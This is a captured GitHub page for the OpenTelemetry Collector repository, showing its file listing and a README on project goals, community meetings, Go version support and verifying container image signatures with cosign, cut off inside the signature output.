    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-telemetry%2Fopentelemetry-collector-contrib%2Ftree%2Fmain%2Freceiver%2Fawsfirehosereceiver)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Ffiles%2Fdisambiguate&source=header-repo&source_repo=open-telemetry%2Fopentelemetry-collector-contrib)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[open-telemetry](/open-telemetry)
/
**[opentelemetry-collector-contrib](/open-telemetry/opentelemetry-collector-contrib)**
Public

* [Notifications](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector-contrib) You must be signed in to change notification settings
* [Fork
  2.5k](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector-contrib)
* [Star
   3.2k](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector-contrib)

* [Code](/open-telemetry/opentelemetry-collector-contrib)
* [Issues
  748](/open-telemetry/opentelemetry-collector-contrib/issues)
* [Pull requests
  145](/open-telemetry/opentelemetry-collector-contrib/pulls)
* [Discussions](/open-telemetry/opentelemetry-collector-contrib/discussions)
* [Actions](/open-telemetry/opentelemetry-collector-contrib/actions)
* [Projects
  0](/open-telemetry/opentelemetry-collector-contrib/projects)
* [Security](/open-telemetry/opentelemetry-collector-contrib/security)
* [Insights](/open-telemetry/opentelemetry-collector-contrib/pulse)

Additional navigation options

* [Code](/open-telemetry/opentelemetry-collector-contrib)
* [Issues](/open-telemetry/opentelemetry-collector-contrib/issues)
* [Pull requests](/open-telemetry/opentelemetry-collector-contrib/pulls)
* [Discussions](/open-telemetry/opentelemetry-collector-contrib/discussions)
* [Actions](/open-telemetry/opentelemetry-collector-contrib/actions)
* [Projects](/open-telemetry/opentelemetry-collector-contrib/projects)
* [Security](/open-telemetry/opentelemetry-collector-contrib/security)
* [Insights](/open-telemetry/opentelemetry-collector-contrib/pulse)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_4b9e3bb1_20250111_082352.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-telemetry%2Fopentelemetry-collector)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-telemetry%2Fopentelemetry-collector)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=open-telemetry%2Fopentelemetry-collector)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[open-telemetry](/open-telemetry)
/
**[opentelemetry-collector](/open-telemetry/opentelemetry-collector)**
Public

* [Notifications](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector) You must be signed in to change notification settings
* [Fork
  1.5k](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector)
* [Star
   4.7k](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector)

OpenTelemetry Collector

[opentelemetry.io](https://opentelemetry.io "https://opentelemetry.io")

### License

[Apache-2.0 license](/open-telemetry/opentelemetry-collector/blob/main/LICENSE)

[4.7k
stars](/open-telemetry/opentelemetry-collector/stargazers) [1.5k
forks](/open-telemetry/opentelemetry-collector/forks) [Branches](/open-telemetry/opentelemetry-collector/branches) [Tags](/open-telemetry/opentelemetry-collector/tags) [Activity](/open-telemetry/opentelemetry-collector/activity)
 [Star](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector)

 [Notifications](/login?return_to=%2Fopen-telemetry%2Fopentelemetry-collector) You must be signed in to change notification settings

* [Code](/open-telemetry/opentelemetry-collector)
* [Issues
  577](/open-telemetry/opentelemetry-collector/issues)
* [Pull requests
  61](/open-telemetry/opentelemetry-collector/pulls)
* [Discussions](/open-telemetry/opentelemetry-collector/discussions)
* [Actions](/open-telemetry/opentelemetry-collector/actions)
* [Projects
  1](/open-telemetry/opentelemetry-collector/projects)
* [Security](/open-telemetry/opentelemetry-collector/security)
* [Insights](/open-telemetry/opentelemetry-collector/pulse)

Additional navigation options

* [Code](/open-telemetry/opentelemetry-collector)
* [Issues](/open-telemetry/opentelemetry-collector/issues)
* [Pull requests](/open-telemetry/opentelemetry-collector/pulls)
* [Discussions](/open-telemetry/opentelemetry-collector/discussions)
* [Actions](/open-telemetry/opentelemetry-collector/actions)
* [Projects](/open-telemetry/opentelemetry-collector/projects)
* [Security](/open-telemetry/opentelemetry-collector/security)
* [Insights](/open-telemetry/opentelemetry-collector/pulse)

# open-telemetry/opentelemetry-collector

    main[Branches](/open-telemetry/opentelemetry-collector/branches)[Tags](/open-telemetry/opentelemetry-collector/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[6,565 Commits](/open-telemetry/opentelemetry-collector/commits/main/) | | |
| [.chloggen](/open-telemetry/opentelemetry-collector/tree/main/.chloggen ".chloggen") | | [.chloggen](/open-telemetry/opentelemetry-collector/tree/main/.chloggen ".chloggen") |  |  |
| [.github](/open-telemetry/opentelemetry-collector/tree/main/.github ".github") | | [.github](/open-telemetry/opentelemetry-collector/tree/main/.github ".github") |  |  |
| [client](/open-telemetry/opentelemetry-collector/tree/main/client "client") | | [client](/open-telemetry/opentelemetry-collector/tree/main/client "client") |  |  |
| [cmd](/open-telemetry/opentelemetry-collector/tree/main/cmd "cmd") | | [cmd](/open-telemetry/opentelemetry-collector/tree/main/cmd "cmd") |  |  |
| [component](/open-telemetry/opentelemetry-collector/tree/main/component "component") | | [component](/open-telemetry/opentelemetry-collector/tree/main/component "component") |  |  |
| [config](/open-telemetry/opentelemetry-collector/tree/main/config "config") | | [config](/open-telemetry/opentelemetry-collector/tree/main/config "config") |  |  |
| [confmap](/open-telemetry/opentelemetry-collector/tree/main/confmap "confmap") | | [confmap](/open-telemetry/opentelemetry-collector/tree/main/confmap "confmap") |  |  |
| [connector](/open-telemetry/opentelemetry-collector/tree/main/connector "connector") | | [connector](/open-telemetry/opentelemetry-collector/tree/main/connector "connector") |  |  |
| [consumer](/open-telemetry/opentelemetry-collector/tree/main/consumer "consumer") | | [consumer](/open-telemetry/opentelemetry-collector/tree/main/consumer "consumer") |  |  |
| [docs](/open-telemetry/opentelemetry-collector/tree/main/docs "docs") | | [docs](/open-telemetry/opentelemetry-collector/tree/main/docs "docs") |  |  |
| [examples](/open-telemetry/opentelemetry-collector/tree/main/examples "examples") | | [examples](/open-telemetry/opentelemetry-collector/tree/main/examples "examples") |  |  |
| [exporter](/open-telemetry/opentelemetry-collector/tree/main/exporter "exporter") | | [exporter](/open-telemetry/opentelemetry-collector/tree/main/exporter "exporter") |  |  |
| [extension](/open-telemetry/opentelemetry-collector/tree/main/extension "extension") | | [extension](/open-telemetry/opentelemetry-collector/tree/main/extension "extension") |  |  |
| [featuregate](/open-telemetry/opentelemetry-collector/tree/main/featuregate "featuregate") | | [featuregate](/open-telemetry/opentelemetry-collector/tree/main/featuregate "featuregate") |  |  |
| [filter](/open-telemetry/opentelemetry-collector/tree/main/filter "filter") | | [filter](/open-telemetry/opentelemetry-collector/tree/main/filter "filter") |  |  |
| [internal](/open-telemetry/opentelemetry-collector/tree/main/internal "internal") | | [internal](/open-telemetry/opentelemetry-collector/tree/main/internal "internal") |  |  |
| [otelcol](/open-telemetry/opentelemetry-collector/tree/main/otelcol "otelcol") | | [otelcol](/open-telemetry/opentelemetry-collector/tree/main/otelcol "otelcol") |  |  |
| [pdata](/open-telemetry/opentelemetry-collector/tree/main/pdata "pdata") | | [pdata](/open-telemetry/opentelemetry-collector/tree/main/pdata "pdata") |  |  |
| [pipeline](/open-telemetry/opentelemetry-collector/tree/main/pipeline "pipeline") | | [pipeline](/open-telemetry/opentelemetry-collector/tree/main/pipeline "pipeline") |  |  |
| [processor](/open-telemetry/opentelemetry-collector/tree/main/processor "processor") | | [processor](/open-telemetry/opentelemetry-collector/tree/main/processor "processor") |  |  |
| [receiver](/open-telemetry/opentelemetry-collector/tree/main/receiver "receiver") | | [receiver](/open-telemetry/opentelemetry-collector/tree/main/receiver "receiver") |  |  |
| [scraper](/open-telemetry/opentelemetry-collector/tree/main/scraper "scraper") | | [scraper](/open-telemetry/opentelemetry-collector/tree/main/scraper "scraper") |  |  |
| [semconv](/open-telemetry/opentelemetry-collector/tree/main/semconv "semconv") | | [semconv](/open-telemetry/opentelemetry-collector/tree/main/semconv "semconv") |  |  |
| [service](/open-telemetry/opentelemetry-collector/tree/main/service "service") | | [service](/open-telemetry/opentelemetry-collector/tree/main/service "service") |  |  |
| [.codecov.yml](/open-telemetry/opentelemetry-collector/blob/main/.codecov.yml ".codecov.yml") | | [.codecov.yml](/open-telemetry/opentelemetry-collector/blob/main/.codecov.yml ".codecov.yml") |  |  |
| [.gitattributes](/open-telemetry/opentelemetry-collector/blob/main/.gitattributes ".gitattributes") | | [.gitattributes](/open-telemetry/opentelemetry-collector/blob/main/.gitattributes ".gitattributes") |  |  |
| [.gitignore](/open-telemetry/opentelemetry-collector/blob/main/.gitignore ".gitignore") | | [.gitignore](/open-telemetry/opentelemetry-collector/blob/main/.gitignore ".gitignore") |  |  |
| [.golangci.yml](/open-telemetry/opentelemetry-collector/blob/main/.golangci.yml ".golangci.yml") | | [.golangci.yml](/open-telemetry/opentelemetry-collector/blob/main/.golangci.yml ".golangci.yml") |  |  |
| [CHANGELOG-API.md](/open-telemetry/opentelemetry-collector/blob/main/CHANGELOG-API.md "CHANGELOG-API.md") | | [CHANGELOG-API.md](/open-telemetry/opentelemetry-collector/blob/main/CHANGELOG-API.md "CHANGELOG-API.md") |  |  |
| [CHANGELOG.md](/open-telemetry/opentelemetry-collector/blob/main/CHANGELOG.md "CHANGELOG.md") | | [CHANGELOG.md](/open-telemetry/opentelemetry-collector/blob/main/CHANGELOG.md "CHANGELOG.md") |  |  |
| [CONTRIBUTING.md](/open-telemetry/opentelemetry-collector/blob/main/CONTRIBUTING.md "CONTRIBUTING.md") | | [CONTRIBUTING.md](/open-telemetry/opentelemetry-collector/blob/main/CONTRIBUTING.md "CONTRIBUTING.md") |  |  |
| [LICENSE](/open-telemetry/opentelemetry-collector/blob/main/LICENSE "LICENSE") | | [LICENSE](/open-telemetry/opentelemetry-collector/blob/main/LICENSE "LICENSE") |  |  |
| [Makefile](/open-telemetry/opentelemetry-collector/blob/main/Makefile "Makefile") | | [Makefile](/open-telemetry/opentelemetry-collector/blob/main/Makefile "Makefile") |  |  |
| [Makefile.Common](/open-telemetry/opentelemetry-collector/blob/main/Makefile.Common "Makefile.Common") | | [Makefile.Common](/open-telemetry/opentelemetry-collector/blob/main/Makefile.Common "Makefile.Common") |  |  |
| [README.md](/open-telemetry/opentelemetry-collector/blob/main/README.md "README.md") | | [README.md](/open-telemetry/opentelemetry-collector/blob/main/README.md "README.md") |  |  |
| [VERSIONING.md](/open-telemetry/opentelemetry-collector/blob/main/VERSIONING.md "VERSIONING.md") | | [VERSIONING.md](/open-telemetry/opentelemetry-collector/blob/main/VERSIONING.md "VERSIONING.md") |  |  |
| [go.mod](/open-telemetry/opentelemetry-collector/blob/main/go.mod "go.mod") | | [go.mod](/open-telemetry/opentelemetry-collector/blob/main/go.mod "go.mod") |  |  |
| [go.sum](/open-telemetry/opentelemetry-collector/blob/main/go.sum "go.sum") | | [go.sum](/open-telemetry/opentelemetry-collector/blob/main/go.sum "go.sum") |  |  |
| [proto\_patch.sed](/open-telemetry/opentelemetry-collector/blob/main/proto_patch.sed "proto_patch.sed") | | [proto\_patch.sed](/open-telemetry/opentelemetry-collector/blob/main/proto_patch.sed "proto_patch.sed") |  |  |
| [renovate.json](/open-telemetry/opentelemetry-collector/blob/main/renovate.json "renovate.json") | | [renovate.json](/open-telemetry/opentelemetry-collector/blob/main/renovate.json "renovate.json") |  |  |
| [versions.yaml](/open-telemetry/opentelemetry-collector/blob/main/versions.yaml "versions.yaml") | | [versions.yaml](/open-telemetry/opentelemetry-collector/blob/main/versions.yaml "versions.yaml") |  |  |
| View all files | | |

## Repository files navigation

* README
* Code of conduct
* Apache-2.0 license
* Security

---

**[Getting Started](https://opentelemetry.io/docs/collector/getting-started/)
  •
[Getting Involved](/open-telemetry/opentelemetry-collector/blob/main/CONTRIBUTING.md)
  •
[Getting In Touch](https://cloud-native.slack.com/archives/C01N6P7KR6W)**

[![Build Status](https://camo.githubusercontent.com/234679ad350487991629c81df73da5f18e92d2b33f677796d67bc586918e9a23/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f616374696f6e732f776f726b666c6f772f7374617475732f6f70656e2d74656c656d657472792f6f70656e74656c656d657472792d636f6c6c6563746f722f6275696c642d616e642d746573742e796d6c3f6272616e63683d6d61696e267374796c653d666f722d7468652d6261646765)](https://github.com/open-telemetry/opentelemetry-collector/actions/workflows/build-and-test.yml?query=branch%3Amain)
[![Go Report Card](https://camo.githubusercontent.com/4c36bb3a12fb1fcb4bf3b11eb9d79c22de984a3ceab2cc5eac1b5464d3214ef1/68747470733a2f2f676f7265706f7274636172642e636f6d2f62616467652f6769746875622e636f6d2f6f70656e2d74656c656d657472792f6f70656e74656c656d657472792d636f6c6c6563746f723f7374796c653d666f722d7468652d6261646765)](https://goreportcard.com/report/github.com/open-telemetry/opentelemetry-collector)
[![Codecov Status](https://camo.githubusercontent.com/8c71c82e14a99c7e360f2d5cd61075fa19f7847d7f09c082ed224186da5f50c4/68747470733a2f2f696d672e736869656c64732e696f2f636f6465636f762f632f6769746875622f6f70656e2d74656c656d657472792f6f70656e74656c656d657472792d636f6c6c6563746f723f7374796c653d666f722d7468652d6261646765)](https://codecov.io/gh/open-telemetry/opentelemetry-collector/branch/main/)
[![GitHub release (latest by date including pre-releases)](https://camo.githubusercontent.com/76bdf098d121f75c4cfa85d08ab0777a23e81bfa41cd5a47033e127986dc4d8a/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f762f72656c656173652f6f70656e2d74656c656d657472792f6f70656e74656c656d657472792d636f6c6c6563746f723f696e636c7564655f70726572656c6561736573267374796c653d666f722d7468652d6261646765)](https://github.com/open-telemetry/opentelemetry-collector/releases)
[![](https://camo.githubusercontent.com/983c93ceeeff1f1786b456759ea3bccba04a37fcd03e827699099d07d19a1046/68747470733a2f2f7777772e626573747072616374696365732e6465762f70726f6a656374732f383430342f6261646765)](https://www.bestpractices.dev/projects/8404)
[![Fuzzing Status](https://camo.githubusercontent.com/cd1e77c7636be7665a54b8a4894b25c9f8ee601ca5090f2822146dcbaf6ae34e/68747470733a2f2f6f73732d66757a7a2d6275696c642d6c6f67732e73746f726167652e676f6f676c65617069732e636f6d2f6261646765732f6f70656e74656c656d657472792e737667)](https://bugs.chromium.org/p/oss-fuzz/issues/list?sort=-opened&can=1&q=proj:opentelemetry)

**[Vision](/open-telemetry/opentelemetry-collector/blob/main/docs/vision.md)
  •
[Configuration](https://opentelemetry.io/docs/collector/configuration/)
  •
[Monitoring](https://opentelemetry.io/docs/collector/internal-telemetry/#use-internal-telemetry-to-monitor-the-collector)
  •
[Security](/open-telemetry/opentelemetry-collector/blob/main/docs/security-best-practices.md)
  •
[Package](https://pkg.go.dev/go.opentelemetry.io/collector)**

---

# [OpenTelemetry Icon](https://camo.githubusercontent.com/8d24629d591a06f2abdab869d0d362552bff745e7e817ec80d70e8c5b371f3d6/68747470733a2f2f6f70656e74656c656d657472792e696f2f696d672f6c6f676f732f6f70656e74656c656d657472792d6c6f676f2d6e61762e706e67) OpenTelemetry Collector

The OpenTelemetry Collector offers a vendor-agnostic implementation on how to
receive, process and export telemetry data. In addition, it removes the need
to run, operate and maintain multiple agents/collectors in order to support
open-source telemetry data formats (e.g. Jaeger, Prometheus, etc.) to
multiple open-source or commercial back-ends.

Objectives:

* Usable: Reasonable default configuration, supports popular protocols, runs and collects out of the box.
* Performant: Highly stable and performant under varying loads and configurations.
* Observable: An exemplar of an observable service.
* Extensible: Customizable without touching the core code.
* Unified: Single codebase, deployable as an agent or collector with support for traces, metrics and logs.

## Community

The OpenTelemetry Collector SIG is present at the [#otel-collector](https://cloud-native.slack.com/archives/C01N6P7KR6W)
channel on the CNCF Slack and [meets once a week](https://github.com/open-telemetry/community#implementation-sigs) via
video calls. Everyone is invited to join those calls, which typically serves the following purposes:

* meet the humans behind the project
* get an opinion about specific proposals
* look for a sponsor for a proposed component after trying already via GitHub and Slack
* get attention to a specific pull-request that got stuck and is difficult to discuss asynchronously

Between 11 July 2024 and 09 January 2025, we'll have our video calls rotating between three time slots, in order to
allow everyone to join at least once every three meetings. The rotation order is as follows:

Tuesday:

* [17:00 PT](https://dateful.com/convert/pst-pdt-pacific-time?t=1700)

Wednesday:

* [09:00 PT](https://dateful.com/convert/pst-pdt-pacific-time?t=0900)
* [05:00 PT](https://dateful.com/convert/pst-pdt-pacific-time?t=0500)

Contributors to the project are also welcome to have ad-hoc meetings for synchronous discussions about specific points.
Post a note in #otel-collector on Slack inviting others, specifying the topic to be discussed. Unless there are strong
reasons to keep the meeting private, please make it an open invitation for other contributors to join. Try also to
identify who would be the other contributors interested on that topic and in which timezones they are.

Remember that our source of truth is GitHub: every decision made via Slack or video calls has to be recorded in the
relevant GitHub issue. Ideally, the agenda items from the meeting notes would include a link to the issue or pull
request where a discussion is happening already. We acknowledge that not everyone can join Slack or the synchronous
calls and don't want them to feel excluded.

## Supported OTLP version

This code base is currently built against using OTLP protocol v1.5.0,
considered Stable. [See the OpenTelemetry Protocol Stability
definition
here.](https://github.com/open-telemetry/opentelemetry-proto?tab=readme-ov-file#stability-definition)

## Stability levels

See [Stability Levels and versioning](/open-telemetry/opentelemetry-collector/blob/main/docs/component-stability.md) for more details.

## Compatibility

When used as a library, the OpenTelemetry Collector attempts to track the currently supported versions of Go, as [defined by the Go team](https://go.dev/doc/devel/release#policy).
Removing support for an unsupported Go version is not considered a breaking change.

Support for Go versions on the OpenTelemetry Collector is updated as follows:

1. The first release after the release of a new Go minor version `N` will add build and tests steps for the new Go minor version.
2. The first release after the release of a new Go minor version `N` will remove support for Go version `N-2`.

Official OpenTelemetry Collector distro binaries will be built with a release in the latest Go minor version series.

## Verifying the images signatures

Note

To verify a signed artifact or blob, first [install Cosign](https://docs.sigstore.dev/cosign/system_config/installation/), then follow the instructions below.

We are signing the images `otel/opentelemetry-collector` and `otel/opentelemetry-collector-contrib` using [sigstore cosign](https://github.com/sigstore/cosign) tool and to verify the signatures you can run the following command:

```
$ cosign verify \
  --certificate-identity=https://github.com/open-telemetry/opentelemetry-collector-releases/.github/workflows/base-release.yaml@refs/tags/<RELEASE_TAG> \
  --certificate-oidc-issuer=https://token.actions.githubusercontent.com \
  <OTEL_COLLECTOR_IMAGE>
```

where:

* `<RELEASE_TAG>`: is the release that you want to validate
* `<OTEL_COLLECTOR_IMAGE>`: is the image that you want to check

Example:

```
$ cosign verify --certificate-identity=https://github.com/open-telemetry/opentelemetry-collector-releases/.github/workflows/base-release.yaml@refs/tags/v0.98.0 --certificate-oidc-issuer=https://token.actions.githubusercontent.com ghcr.io/open-telemetry/opentelemetry-collector-releases/opentelemetry-collector-contrib:0.98.0

Verification for ghcr.io/open-telemetry/opentelemetry-collector-releases/opentelemetry-collector-contrib:0.98.0 --
The following checks were performed on each of these signatures:
  - The cosign claims were validated
  - Existence of the claims in the transparency log was verified offline
  - The code-signing certificate was verified using trusted certificate authority certificates

[{"critical":{"identity":{"docker-reference":"ghcr.io/open-telemetry/opentelemetry-collector-releases/opentelemetry-collector-contrib"},"image":{"docker-manifest-digest":"sha256:5cea85bcbc734a3c0a641368e5a4ea9d31b472997e9f2feca57eeb4a147fcf1a"},"type":"cosign container image signature"},"optional":{"1.3.6.1.4.1.57264.1.1":"https://token.actions.githubusercontent.com","1.3.6.1.4.1.57264.1.2":"push","1.3.6.1.4.1.57264.1.3":"9e20bf5c142e53070ccb8320a20315fffb41469e","1.3.6.1.4.1.57264.1.4":"Release Contrib","1.3.6.1.4.1.57264.1.5":"open-telemetry/opentelemetry-collector-releases","1.3.6.1.4.1.57264.1.6":"refs/tags/v0.98.0","Bundle":{"SignedEntryTimestamp":"MEUCIQDdlmNeKXQrHnonwWiHLhLLwFDVDNoOBCn2sv85J9P8mgIgDQFssWJImo1hn38VlojvSCL7Qq5FMmtnGu0oLsNdOm8=","Payload":{"body":"eyJhcGlWZXJzaW9uIjoiMC4wLjEiLCJraW5kIjoiaGFzaGVkcmVrb3JkIiwic3BlYyI6eyJkYXRhIjp7Imhhc2giOnsiYWxnb3JpdGhtIjoic2hhMjU2IiwidmFsdWUiOiIxMzVjY2RlN2YzZTNhYjU2NmFmYzJhYWU3MDljYmJlNmFhMDZlZWMzNDA2MWNkZjMyNmRhYzM2MmY0NWM4Yjg4In19LCJzaWduYXR1cmUiOnsiY29udGVudCI6Ik1FVUNJUURFbDV6N0diMWRVYkM5KzR4c1VvbDhMcWZNV2hiTzhkdEpwdExyMXhUNWZnSWdTdEwwN1I0ZDA5R2x0ZkV0azJVbmlJSlJhQVdrVDJNWDVtRXJNSlplc2pRPSIsInB1YmxpY0tleSI6eyJjb250ZW50IjoiTFMwdExTMUNSVWRKVGlCRFJWSlVTVVpKUTBGVVJTMHRMUzB0Q2sxSlNVaG9ha05EUW5jeVowRjNTVUpCWjBsVlNETkNjRFZTYlVSU1VpOXphMWg0YVdWUFlrcFhSbmRrUjNNNGQwTm5XVWxMYjFwSmVtb3dSVUYzVFhjS1RucEZWazFDVFVkQk1WVkZRMmhOVFdNeWJHNWpNMUoyWTIxVmRWcEhWakpOVWpSM1NFRlpSRlpSVVVSRmVGWjZZVmRrZW1SSE9YbGFVekZ3WW01U2JBcGpiVEZzV2tkc2FHUkhWWGRJYUdOT1RXcFJkMDVFUlhoTlJGRjRUMFJOTlZkb1kwNU5hbEYzVGtSRmVFMUVVWGxQUkUwMVYycEJRVTFHYTNkRmQxbElDa3R2V2tsNmFqQkRRVkZaU1V0dldrbDZhakJFUVZGalJGRm5RVVZyWlRsSE1ubHNjMjkzYVZZMmRFOVZSazlRVVhNd2NXY3hTSEV5WmpsVUx6UTJZbEFLU1ZSNE0ybFRkVXBhV0hGc1dEUldWV2Q1VlZndmNVazJhblZ2WlZSVEswaG5XVUoyYjBseVNERTFUeTltZEd0VmVtRlBRMEpwZDNkbloxbHZUVUUwUndwQk1WVmtSSGRGUWk5M1VVVkJkMGxJWjBSQlZFSm5UbFpJVTFWRlJFUkJTMEpuWjNKQ1owVkdRbEZqUkVGNlFXUkNaMDVXU0ZFMFJVWm5VVlZHTkRrMUNrdDFNRWhqTm5rek1rNUNTVTFFU21ReVpuWkxNMHBCZDBoM1dVUldVakJxUWtKbmQwWnZRVlV6T1ZCd2VqRlphMFZhWWpWeFRtcHdTMFpYYVhocE5Ga0tXa1E0ZDJkWldVZEJNVlZrUlZGRlFpOTNVamhOU0hGSFpVZG9NR1JJUW5wUGFUaDJXakpzTUdGSVZtbE1iVTUyWWxNNWRtTkhWblZNV0ZKc1lrZFdkQXBhV0ZKNVpWTTVkbU5IVm5Wa1IxWnpXbGN4YkdSSVNqVk1WMDUyWWtkNGJGa3pVblpqYVRGNVdsZDRiRmxZVG14amVUaDFXakpzTUdGSVZtbE1NMlIyQ21OdGRHMWlSemt6WTNrNWFWbFlUbXhNV0Vwc1lrZFdhR015VlhWbFYwWjBZa1ZDZVZwWFducE1NMUpvV2pOTmRtUnFRWFZQVkdkMVRVUkJOVUpuYjNJS1FtZEZSVUZaVHk5TlFVVkNRa04wYjJSSVVuZGplbTkyVEROU2RtRXlWblZNYlVacVpFZHNkbUp1VFhWYU1td3dZVWhXYVdSWVRteGpiVTUyWW01U2JBcGlibEYxV1RJNWRFMUNTVWREYVhOSFFWRlJRbWMzT0hkQlVVbEZRa2hDTVdNeVozZE9aMWxMUzNkWlFrSkJSMFIyZWtGQ1FYZFJiMDlYVlhsTlIwcHRDazVYVFhoT1JFcHNUbFJOZDA1NlFtcFpNa2swVFhwSmQxbFVTWGROZWtVeFdtMWFiVmxxVVhoT1JGazFXbFJCWkVKbmIzSkNaMFZGUVZsUEwwMUJSVVVLUWtFNVUxcFhlR3haV0U1c1NVVk9kbUp1VW5saFYwbDNVRkZaUzB0M1dVSkNRVWRFZG5wQlFrSlJVWFppTTBKc1lta3hNRnBYZUd4aVYxWXdZMjVyZGdwaU0wSnNZbTVTYkdKSFZuUmFXRko1WlZNeGFtSXllSE5hVjA0d1lqTkpkR050Vm5OYVYwWjZXbGhOZDBoM1dVdExkMWxDUWtGSFJIWjZRVUpDWjFGU0NtTnRWbTFqZVRrd1dWZGtla3d6V1hkTWFtczBUR3BCZDA5M1dVdExkMWxDUWtGSFJIWjZRVUpEUVZGMFJFTjBiMlJJVW5kamVtOTJURE5TZG1FeVZuVUtURzFHYW1SSGJIWmliazExV2pKc01HRklWbWxrV0U1c1kyMU9kbUp1VW14aWJsRjFXVEk1ZEUxSlIwbENaMjl5UW1kRlJVRlpUeTlOUVVWS1FraHZUUXBsUjJnd1pFaENlazlwT0haYU1td3dZVWhXYVV4dFRuWmlVemwyWTBkV2RVeFlVbXhpUjFaMFdsaFNlV1ZUT1haalIxWjFaRWRXYzFwWE1XeGtTRW8xQ2t4WFRuWmlSM2hzV1ROU2RtTnBNWGxhVjNoc1dWaE9iR041T0hWYU1td3dZVWhXYVV3elpIWmpiWFJ0WWtjNU0yTjVPV2xaV0U1c1RGaEtiR0pIVm1nS1l6SlZkV1ZYUm5SaVJVSjVXbGRhZWt3elVtaGFNMDEyWkdwQmRVOVVaM1ZOUkVFMFFtZHZja0puUlVWQldVOHZUVUZGUzBKRGIwMUxSR3hzVFdwQ2FRcGFhbFpxVFZSUmVWcFVWWHBOU